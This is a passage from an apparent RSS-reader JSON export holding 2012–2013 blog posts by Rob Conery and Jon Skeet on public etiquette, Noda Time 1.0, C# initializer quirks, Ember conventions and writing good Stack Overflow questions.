author}}</span><span class='line'><span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span></code></pre></td></tr></table></div></figure><p>To a more advanced solution involving directives (which I'll sidestep for now - this post is long enough). My ultimate point is that we're in presentation land here and while it's tempting to put your engineering muscle to work, there's just no need.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/VvpPVADxNBA\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1271}}
{"k":"0000000084","o":"0000009038","v":"001"}
{"_id":1272,"_uid":1272,"_dt":1373742620975,"_s":"e608db0958f03f5e57adc9b6c4769871"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/ZagFlqH-NhI/hell-is-other-people","title":"Hell... Is Other People","published":{"$wrap":"$date","v":1363964400000,"h":"2013-03-22T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>Get up from your desk or chair or floor and go for a walk. Right now - I challenge you to do this. If you can walk through a crowded place - that's even better. Go by yourself, and soak it in... all of it...</p><p><img src='http://wekeroad.com/images/hell_other_people.jpg'/></p><p><p><em>image from<a href=\"http://venndiagrams.tumblr.com/post/1269983588/robotrobotrobot-hell-is-other-people-venn\">venndiagrams.tumblr.com</a></em></p><h2>Garrett Is A JERK</h2><p>It's 7:40am and I'm sitting outside my office with a warm, steamy cup of my favorite roast from Hanalei Roasting company. It's the perfect shade of rich, deep oakey-brown that tells me I hit the right mixture of milk and sugar.</p><p>I'm looking over the hills from the upstairs walkway in front of my office door. Behind me, the door is open and work is waiting for me... in front of me the sun is poking through the golden morning clouds and the dew from the damp air is everywhere.</p><p>It's quiet, and I'm loving it.<strong>Until Garrett entered my life</strong>.</p><p>Well, it was Garrett's girlfriend, actually. It started with a low, shrill sound that came from around the parking lot. It was muffled somewhat but it sounded like someone in trouble. Naturally I looked around, thinking someone might need my help.</p><p>Then all of a sudden the volume increased dramatically as she got out of her car. She was in full hysterics, yelling into the phone about how Garrett was a FUCKING PIECE OF SHIT JERK ASSHOLE etc. etc.</p><p>She stood there for about 30 seconds in the parking lot that was filling with cars as people came to work. They walked past her, careful not to look.</p><p>After a while she slammed the door of her car and stormed upstairs. She works in the office next to mine. I decided to give her some space so I went inside and shut the door. She decided to stay outside and vent her rage over the entire parking lot, into the golden sunrise morning I was just enjoying.</p><p>She stayed there for 20 minutes, then went inside. I got to learn all about Garrett... who apparently is not a very nice person.</p><h2>Yeah Yeah Yeah</h2><p>4 weeks ago I took my family to Kalihiwai Beach where we like to go for barbeques with friends. It was a lovely night, the sun setting much the same way it comes up: golden light poking through swollen, puffed clouds full of warm rain.</p><p>6 of us were sitting around the tailgate of my truck, when right next to us pulls up a black Hummer with blinking blue lights underneath. It's a high-end\"situational\" rental car that is completely out of place here, on this beach in Hawaii. It's an LA ride that looks like the UFO it was apparently dropped from.</p><p>Out of the car comes a 30-something markety/dotcom guy. Thick glasses, tall and in shape. He's from LA - as am I - and we can smell it on each other. He tips his head back:\"SUP\".</p><p>We wave as he reaches back in his car and flips on, full volume,<a href=\"https://www.youtube.com/watch?v=umAL-6-j1Ew\">one of the worst remixes of one of the best Yeah Yeah Yeahs songs there is</a>. He opens the door wide - the one that faces us. He then goes to the back door and does the same... and then turns it up with a remote control in his pocket. All... the way... UP.</p><p>My chest thumps as the bass booms from inside. Purple beat-lights glow with the pulse of this horrible song as the trees ring with the echo of cheesy synth loops.</p><p>He's 20 feet away from us. There are no other cars on this half-mile stretch of beach. He's got this song on a loop so it plays... continually.</p><p>As opposed to Garrett's girlfriend, we didn't stand for it long. My buddy's wife casually went over and asked them to shut the doors facing us and to ... maybe open the doors facing them (no, really). They did, but not without giving stink eye.</p><h2>Bookended</h2><p>At lunch 3 months ago I sat at a table with a friend from out of town and a couple proceeded to get into a fight next to us. The lady stood up to storm away but thought of something clever so turned around just on the other side of us and, snappily, and let him have it. A lovely insult about his new car, flying right over the top of our heads and into his anger-laden face.</p><p>He fought back, she stayed put. We're square in the middle. I sat back and just listened - turning my head as if at an emotional tennis match between the two. The guy looked at me as if to say\"bug off\", I shrugged with my hands in the air (\"where should I go?\")... and they went outside... glaring back at me on the way.</p><h2>CONTEXT</h2><p>So many people are absolutely, stunningly unaware about the little bubble that surrounds them, defined by their thoughts, emotions and words. An interesting (and at the same time scary) thing is that groups of us share these things together - and our bubbles grow as we join into a group.</p><p>We walk around like pachinko balls ... bouncing our bubbles off someone else's. They either repel, or like bubbles, can join and grow larger. You can manage this process.</p><p>In a room full of other people, you have to manage that bubble of yours quite methodically - especially when you're with a group of friends having what you think is a private conversation.<strong>It almost never is</strong>.</p><p>That person sitting next to you on the bus/train/plane speaking really loudly into their cellphone? The new parents involving the entire restaurant in the little game they're playing with little Dylan? Or maybe the person in the front of the line who just now thought about looking at the menu and deciding what to eat...</p><p>Awareness. A Good Thing.</p><p>Whatever you're saying, thinking, emoting - all of it is shared with the people around you to some degree - even if they can't directly hear you. We're a sensitive animal and have senses built into us forged by millions of years of survival, intellect, and cunning. To pretend that words alone define meaning is complete folly.</p><p>Joking with your friend in a room full of diverse people isn't necessarily harmful, until you become blind to your own context as each of the people in the above stories were. Sometimes it doesn't matter. Other times it does.</p><p>You might be sitting next to someone who's sitting on an emotional grenade. That clever little joke you just made? It could be about guns, politics, gay marriage... or dongles. Well it might set that grenade off.</p><p>Call it professionalism, politeness, or just Old Fashioned Decency - it's why these things exist:<strong>so we can get along and avoid atomic swarm tendencies</strong>.</p><p>Until another person welcomes you into their context - no - you're not free (socially speaking) to do as you please without consequence. As much as you might feel you're protected by law to walk naked down the street singing that horrid Yeah Yeah Yeahs remix - your actions have an effect (and consequence) with others.</p><p>The same goes for being upset. Be aware of yourself and just how angry you've become. Think about why, and remember you're in public, around strangers. Think about your actions carefully in the way that the people in the story above did not.</p><p>This doesn't simply sit along gender lines (saying<a href=\"http://blog.8thlight.com/uncle-bob/2013/03/22/There-are-ladies-present.html\">There are Ladies Present</a>is a bit off the mark to me - the issue could as well have been racial or religious). I prefer to think<strong>there are other people present</strong>.</p><p>The only way to truly avoid the hell that can be other people is to understand the power of your own presence. Believe that you<strong>do</strong>have an effect on others.<strong>Just make it a positive one</strong>always.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/ZagFlqH-NhI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1272}}
{"k":"0000000084","o":"0000003561","v":"001"}
{"_id":1273,"_uid":1273,"_dt":1373742620975,"_s":"4045a82fd39ffe5542fe28207771e426"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/pQJt1QF_W90/noda-time-v1-0-released.aspx","title":"Noda Time v1.0 released","published":{"$wrap":"$date","v":1352331404000,"h":"2012-11-07T23:36:44.000Z"},"starred":false,"read":false,"content":"<p>Go get Noda Time 1.0!</p><ul><li><a href=\"http://nuget.org/packages/NodaTime/1.0.0\">NuGet package</a>(and the<a href=\"http://nuget.org/packages/NodaTime.Testing/1.0.0\">testing package</a>)</li><li><a href=\"https://code.google.com/p/noda-time\">Project home page</a></li><li><a href=\"https://code.google.com/p/noda-time/downloads/list\">Project downloads page</a></li><li><a href=\"http://noda-time.googlecode.com/hg-history/1.0.x/docs/userguide/index.html\">v1.0 user guide</a></li><li><a href=\"http://noda-time.googlecode.com/hg-history/1.0.x/docs/api/Index.html\">v1.0 API reference</a></li></ul><p>Today is the end of the longest release cycle I've been personally involved in. On November 5th 2009, I<a href=\"http://msmvps.com/blogs/jon_skeet/archive/2009/11/05/what-s-in-a-name-again.aspx\">announced my intention</a>to write a port of Joda Time for .NET.<a href=\"http://msmvps.com/blogs/jon_skeet/archive/2009/11/06/noda-time-is-born.aspx\">The next day, Noda Time was born</a>- with a lofty (foolhardy) set of targets.</p><p>Near the end of a talk *about* Noda Time this evening, I released Noda Time 1.0.0.</p><p>It's taken three years, but I'm immensely proud of what we've managed to achieve. We're far from\"done\" but I believe we're already significantly ahead of most other date/time APIs I've seen in terms of providing a clean API which reduces *incidental* complexity while highlighting the *inherent* complexity of the domain. (This is a theme I'm becoming dogmatic about on various fronts.)</p><p>There's more to do - I can't see myself considering Noda Time to be\"done\" any time soon - but hopefully now we've got a stable release, we can start to build user momentum.</p><p>One point I raised at the<a href=\"http://www.dotnetdevnet.com\">DotNetDevNet</a>presentation tonight was that there's a definite benefit (in my very biased view) in just *looking into* Noda Time:</p><ul><li>If you can't use it in your production code, use it when prototyping</li><li>If you can't use it in your prototype code, play with it in personal projects</li><li>If you can't use it in personal projects, read the user guide to understand the concepts</li></ul><p>I hope that simply looking at the various types that Noda Time providers will give you more insight into how you should be thinking about date and time handling in your code. While the BCL API has a lot of flaws, you can work around most of them if you make it crystal clear what your data means at every step. The type system will leave that largely ambiguous, but there's nothing to stop you from naming your variables descriptively, and adding appropriate<br />comments.</p><p>Of course, I would far prefer it if you'd start using Noda Time and raising issues on how to make it better. Spread the word.</p><p>Oh, and if anyone from the BCL team is reading this and would like to include something like Noda Time into .NET 5 as a\"next generation\" date/time, I'd be *really* interested in talking to you :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1818929\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/pQJt1QF_W90\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1273}}
{"k":"0000000084","o":"0000001622","v":"001"}
{"_id":1274,"_uid":1274,"_dt":1373742620976,"_s":"9d17cae35ff59490428814417a1cb2ec"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/mbJpzW_rB34/c-in-depth-3rd-edition-available-for-early-access-plus-a-discount-code.aspx","title":"C# in Depth 3rd edition available for early access, plus a discount code…","published":{"$wrap":"$date","v":1361025114000,"h":"2013-02-16T14:31:54.000Z"},"starred":false,"read":false,"content":"<p>Readers who follow me on Twitter or Google+ know this already, but…</p><p>The third edition of C# in Depth is now available for early access from<a href=\"http://www.manning.com/skeet3/\">its page on the Manning website</a>. I’ve been given a special discount code which expires at midnight EST on February 17th, so be quick if you want to use it – it gives 50% off either version. The code is “csharpsk”.</p><p>It’s likely that we’ll have a separate (permanent) discount for readers who already own the second edition, but the details of that haven’t been decided yet.</p><p>Just to be clear, the third edition is<em>largely</em>the second edition plus the changes to cover C# 5 – I haven’t done as much rewriting as I did for the second edition, mostly because I was already pretty happy with the second edition :) Obviously the largest (by far) feature in C# 5 is async/await, which is covered in detail in the new chapter 15.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1823884\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/mbJpzW_rB34\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1274}}
{"k":"0000000084","o":"0000007992","v":"001"}
{"_id":1275,"_uid":1275,"_dt":1373742620976,"_s":"51007a3837a747caa5664198e82b5120"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/24RyeQVpi8Y/fun-with-object-and-collection-initializers.aspx","title":"Fun with Object and Collection Initializers","published":{"$wrap":"$date","v":1360882740000,"h":"2013-02-14T22:59:00.000Z"},"starred":false,"read":false,"content":"<p>Gosh it feels like a long time since I’ve blogged – particularly since I’ve blogged anything really C#-language-related.</p><p>At some point I want to blog about my two CodeMash 2013 sessions (making the C# compiler/team cry, and learning lessons about API design from the Spice Girls) but those will take significant time – so here’s a quick post about object and collection initializers instead. Two interesting little oddities...</p><h1>Is it an object initializer? Is it a collection initializer? No, it’s a syntax error!</h1><p>The first part came out of a real life situation –<a href=\"https://code.google.com/p/noda-time/source/browse/src/NodaTime.Testing/TimeZones/FakeDateTimeZoneSource.cs\">FakeDateTimeZoneSource</a>, if you want to look at the complete context.</p><p>Basically, I have a class designed to help test time zone-sensitive code. As ever, I like to create immutable objects, so I have a builder class. That builder class has various properties which we’d like to be able to set, and we’d also like to be able to provide it with the time zones it supports, as simply as possible. For the zones-only use case (where the other properties can just be defaulted) I want to support code like this:</p><div class=\"code\"><span class=\"Linq\">var</span>source =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    CreateZone(<span class=\"String\">\"x\"</span>),<br />    CreateZone(<span class=\"String\">\"y\"</span>),<br />    CreateZone(<span class=\"String\">\"a\"</span>),<br />    CreateZone(<span class=\"String\">\"b\"</span>)<br />}.Build();</div><p>(<code>CreateZone</code>is just a method to create an arbitrary time zone with the given name.)</p><p>To achieve this, I made the<code>Builder</code>implement<code>IEnumerable&lt;DateTimeZone&gt;</code>, and created an<code>Add</code>method. (In this case the<code>IEnumerable&lt;&gt;</code>implementation actually works; in another case I've used explicit interface implementation and made the<code>GetEnumerator()</code>method throw<code>NotSupportedException</code>, as it's really not<em>meant</em>to be called in either case.)</p><p>So far, so good. The collection initializer worked perfectly as normal. But what about when we want to set some other properties? Without any time zones, that's fine:</p><div class=\"code\"><span class=\"Linq\">var</span>source =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span><br />}.Build();</div><p>But how could we set<code>VersionId</code><em>and</em>add some zones? This doesn't work:</p><div class=\"code\"><span class=\"Linq\">var</span>invalid =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span>,<br />    CreateZone(<span class=\"String\">\"x\"</span>),<br />    CreateZone(<span class=\"String\">\"y\"</span>)<br />}.Build();</div><p>That's neither a valid object initializer (the second part doesn't specify a field or property) nor a valid collection initializer (the first part<em>does</em>set a property).</p><p>In the end, I had to expose an<code>IList&lt;DateTimeZone&gt;</code>property:</p><div class=\"code\"><span class=\"Linq\">var</span>valid =<span class=\"Keyword\">new</span>FakeDateTimeZoneSource.Builder<br />{<br />    VersionId =<span class=\"String\">\"foo\"</span>,<br />    Zones = { CreateZone(<span class=\"String\">\"x\"</span>), CreateZone(<span class=\"String\">\"y\"</span>) }<br />}.Build();</div><p>An alternative would have been to expose a propert of type<code>Builder</code>which just returned itself - the same code would have been valid, but it would have been distinctly odd, and allowed some<em>really</em>spurious code.</p><p>I'm happy with the result in terms of the flexibility for clients - but the class design feels a bit messy, and I wouldn't have wanted to expose this for the\"production\" assembly of Noda Time.</p><p>Describing all of this to a colleague gave rise to the following rather sillier observation...</p><h1>Is it an object initializer? Is it a collection initializer? (Parenthetically speaking...)</h1><p>In a lot of C# code, an assignment expression is just a normal expression. That means there's<em>potentially</em>room for ambiguity, in exactly the same kind of situation as above - when sometimes we want a collection initializer, and sometimes we want an object initializer. Consider this sample class:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Collections;<br /><br /><span class=\"ReferenceType\">class</span>Weird : IEnumerable<br />{<br />   <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>Foo { get; set; }<br />    <br />   <span class=\"Modifier\">private</span> <span class=\"ValueType\">int</span>count;<br />   <span class=\"Modifier\">public</span> <span class=\"ValueType\">int</span>Count { get {<span class=\"Statement\">return</span>count; } }<br />        <br />   <span class=\"Modifier\">public</span> <span class=\"ValueType\">void</span>Add(<span class=\"ReferenceType\">string</span>x)<br />    {<br />        count++;<br />    }<br />            <br />    IEnumerator IEnumerable.GetEnumerator()<br />    {<br />       <span class=\"Statement\">throw</span> <span class=\"Keyword\">new</span>NotSupportedException();<br />    }    <br />}</div><p>As you can see, it doesn't actually remember anything passed to the<code>Add</code>method, but it does remember how many times we've called it.</p><p>Now let's try using<code>Weird</code>in two ways which<em>only</em>differ in terms of parentheses. First up, no parentheses:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>Foo =<span class=\"String\">\"x\"</span>;<br />Weird weird =<span class=\"Keyword\">new</span>Weird { Foo =<span class=\"String\">\"y\"</span>};<br />    <br />Console.WriteLine(Foo);        <span class=\"InlineComment\">// x</span><br />Console.WriteLine(weird.Foo);  <span class=\"InlineComment\">// y</span><br />Console.WriteLine(weird.Count);<span class=\"InlineComment\">// 0</span></div><p>Okay, so it's odd having a local variable called<code>Foo</code>, but we're basically fine. This is an<em>object</em>initializer, and it's setting the<code>Foo</code>property within the new<code>Weird</code>instance. Now let's add a pair of parentheses:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>Foo =<span class=\"String\">\"x\"</span>;<br />Weird weird =<span class=\"Keyword\">new</span>Weird { (Foo =<span class=\"String\">\"y\"</span>) };<br />    <br />Console.WriteLine(Foo);        <span class=\"InlineComment\">// y</span><br />Console.WriteLine(weird.Foo);  <span class=\"InlineComment\">// Nothing (null)</span><br />Console.WriteLine(weird.Count);<span class=\"InlineComment\">// 1</span></div><p>Just adding those parenthese turn the object initializer into a collection initializer, whose sole item is the result of the assignment operator - which is the value which has now been assigned to<code>Foo</code>.</p><p>Needless to say, I<em>don't</em>recommend using this approach in real code...</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1823825\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/24RyeQVpi8Y\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1275}}
{"k":"0000000084","o":"0000006823","v":"001"}
{"_id":1276,"_uid":1276,"_dt":1373742620976,"_s":"93a51aa7766f6cf006aa1e012620f7c2"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/yy_zah6tFWw/convention-over-incantation","title":"Convention Over Incantation?","published":{"$wrap":"$date","v":1363618800000,"h":"2013-03-18T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>Convention over Configuration is now simply an assumed thing for modern frameworks - and this is (mostly) a good thing. Sometimes I wonder if it's being taken too far.</p><p><img src='http://wekeroad.com/images/incantations.jpg'/></p><p><h2>Conventions? Curations? Innovations?</h2><p>Convention over Configuration is a\"pull\" - meaning that it's derived from practice. Conventions evolve and ultimately people agree on them… thus the term\"convention\".</p><p>Rails made use of this most profoundly when it was introduced. From<a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles Bowkett</a>:</p><blockquote><p>When Rails first arrived, in many instances, it took the greatest ideas and most common use cases of Web development, streamlined them, simplified their developer interface, and repackaged them within cleaner APIs.</p></blockquote><p>Rails also decided to innovate at the same time, and mixed together its conventions with its innovations. The results have been mixed (in my experience):</p><ul><li>The Asset Pipeline was an interesting solution to a problem that I'm not sure many people had. I spent more time trying to get the thing to work as expected - and then finally tossed it.</li><li>I used CoffeeScript for a bit, but don't care much for it. This decreases the interest in the Asset Pipeline.</li><li>I like RSpec. I like Factories vs. Fixtures.<a href=\"http://www.youtube.com/watch?v=obOd7WrrTWQ\">I tend to completely replace the entire testing experience Rails</a>.</li></ul><p>These aren't complaints, really. Every framework you use needs to be modified to a degree to fit how you work - but I do agree with Giles' assertion:</p><blockquote><p>it is literally impossible to impose a convention on a community. It is a contradiction in terms, Orwellian doublespeak, and the human-language equivalent of a syntax error.</p></blockquote><p>For all of the syntax niggling, Rails still lets me do what I want/need to do so I'm a happy camper. I also think the\"conventions\" it once imposed are being tweaked by innovation and becoming something else.</p><p><a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles calls it\"Curation over Configuration\"</a>and I think I agree with him.</p><h2>Put Your Left Foot Here, Touch Your Nose, And…</h2><p>It seems that most frameworks (of any kind) are beginning to follow Rails' example by introducing some level of Convention over Configuration. This is a great timesaver,<strong>unless there are no conventions to adopt</strong>.</p><p>Which is something I've encountered with EmberJS. No, I'm not going to rant on Ember - I'm still pursuing Trek's prediction:</p><p><blockquote class=\"twitter-tweet\"><p>@<a href=\"https://twitter.com/locks\">locks</a>next post will be about @<a href=\"https://twitter.com/robconery\">robconery</a>'s Road to Damascus Moment. ;)</p>— Trek Glowacki (@trek)<a href=\"https://twitter.com/trek/status/310882156425650177\">March 10, 2013</a></blockquote><script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script></p><p>I haven't given up on Ember - even though I said as much in my last post. Well it's partly<strong>because of my last post</strong>that I can't give up - it wouldn't be fair of me would it :).</p><p>As I dive into Ember more, however,<a href=\"http://emberjs.com/guides/concepts/naming-conventions/\">I've begun musing on\"conventions\" in general</a>:</p><blockquote><p>Ember.js uses naming conventions to wire up your objects without a lot of boilerplate. You will want to use the conventional names for your routes, controllers and templates.</p></blockquote><p>By\"convention\" the team means\"prescription\". This is important because<strong>there is no convention</strong>when it comes to Single Page Applications in the traditional sense of the word\"convention\".<strong>Their naming guidelines are prescriptive</strong>- and something more.</p><p>A lot of frameworks do this kind of thing: Rails, Django, ASP.NET MVC (and I'm sure many others) expect certain files (views, for instance) to be in a particular place (which you can usually override). I like this - it promotes consistency.</p><p>Ember takes this to a different level, however. If you name things a certain way<a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/getting-into-ember-js/\">you can benefit from background code generation</a>:</p><blockquote><p>One of the ways that Ember.js helps to minimize the amount of code needed and handle things for you behind the scenes is through naming conventions. The way that you define and name your routes (and resources) impacts the naming of your controllers, models, views and templates</p></blockquote><p><strong>At what point do we call these\"Incantations\" instead of\"Conventions\"</strong>?</p><h2>The Light Isn't Blinding Me Yet</h2><p>Again - not here to pick on Ember. Strong naming has been around for a while (though I'm not sure I've seen it trigger code generation) and, far from condemning Ember - I applaud the team for taking a bold step.</p><p>I'll admit that it's not immediately sitting right with me, but I'm going to give it time to see how hard it will be for the incantations to work their way into daily memory. I'll<a href=\"http://en.wikipedia.org/wiki/Conversion_of_Paul_the_Apostle\">keep travelling the road</a>... until I'm blinded by the light or... get delirious from the heat.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/yy_zah6tFWw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1276}}
{"k":"0000000084","o":"0000003851","v":"001"}
{"_id":1277,"_uid":1277,"_dt":1373742620976,"_s":"2d38b2b2f71fcdbc2ee056fea39cc99e"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/_QzxQfuWC9A/stack-overflow-question-checklist.aspx","title":"Stack Overflow question checklist","published":{"$wrap":"$date","v":1353748948000,"h":"2012-11-24T09:22:28.000Z"},"starred":false,"read":false,"content":"<p>My<a href=\"http://tinyurl.com/so-hints\">earlier post</a>on how to write a good question is pretty long, and I suspect that even when I refer people to it, often they don't bother reading it. So here's a short list of questions to check after you've written a question (and to think about<em>before</em>you write the question):</p><li>Have you done some research before asking the question?<sup>1</sup></li><li>Have you explained what you've already tried to solve your problem?</li><li>Have you specified which language and platform you're using, including version number where relevant?</li><li>If your question includes code, have you written it as a short but complete program?<sup>2</sup></li><li>If your question includes code, have you checked that it's correctly formatted?<sup>3</sup></li><li>If your code doesn't compile, have you included the exact compiler error?</li><li>If your question<em>doesn't</em>include code, are you sure it shouldn't?</li><li>If your program throws an exception, have you included the exception, with both the message and the stack trace?</li><li>If your program produces different results to what you expected, have you stated what you expected,<em>why</em>you expected it, and the actual results?</li><li>If your question is related to anything locale-specific (languages, time zones) have you stated the relevant information about your system (e.g. your current time zone)?</li><li>Have you checked that your question looks reasonable in terms of formatting?</li><li>Have you checked the spelling and grammar to the best of your ability?<sup>4</sup></li><li>Have you read the whole question to yourself carefully, to make sure it makes sense and contains enough information for someone coming to it without any of the context that you already know?<p>If the answer to any of these questions is\"no\" you should take the time to fix up your question before posting. I realize this may seem like a lot of effort, but it will help you to get a useful answer as quickly as possible. Don't forget that you're basically asking other people to help you out of the goodness of their heart - it's up to you to do all you can to make that as simple as possible.</p><hr /><p><sup>1</sup>If you went from\"something's not working\" to\"asking a question\" in less than 10 minutes, you probably haven't done enough research.</p><p><sup>2</sup>Ideally anyone answering the question should be able to copy your code, paste it into a text editor, compile it, run it, and observe the problem. Console applications are good for this - unless your question is directly about a user interface aspect, prefer to write a short console app. Remove anything not directly related to your question, but keep it complete enough to run.</p><p><sup>3</sup>Try to avoid code which makes users scroll horizontally. You may well need to change how you split lines from how you have it in your IDE. Take the time to make it as clear as possible for those trying to help you.</p><p><sup>4</sup>I realize that English isn't the first language for many Stack Overflow users. We're not looking for perfection - just some effort. If you know your English isn't good, see if a colleague or friend can help you with your question before you post it.</p></li><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1819786\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/_QzxQfuWC9A\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1277}}
{"k":"0000000084","o":"0000032746","v":"001"}
{"_id":1278,"_uid":1278,"_dt":1373742620977,"_s":"a7446ddece6ba7c582840dbee5f4dfb2"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/fCXbpkBXK6M/ember-confuses-me","title":"EmberJS Confuses Me","published":{"$wrap":"$date","v":1362582000000,"h":"2013-03-06T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I've been teeth-deep in Client-side Javascript frameworks over the last 4 months for Tekpub. This month is Angular, last month was Ember's turn and I gave up. It's the first time I've given up - here's why.</p><p><img src='http://wekeroad.com/images/spinning-dizzy.jpeg'/></p><p><h2>I Tried</h2><p>Saying something confuses me is no great claim - many things do. It's entirely likely that I didn't study Ember long enough, or maybe I didn't give it the\"time to soak in\" that it deserved. Either way I punted on my efforts to bring an Ember title to Tekpub.</p><p>Normally I'd just go about my business and sidestep posts like this one - but today I had a conversation with Trek Glowacki (core dev on the Ember team) and he was confused as to my confusion. I offered to blog my thoughts - he couldn't understand the points I was making about my confusion.</p><p>So here's that post, stripped of hyperbole and\"it's ON FIRE\" 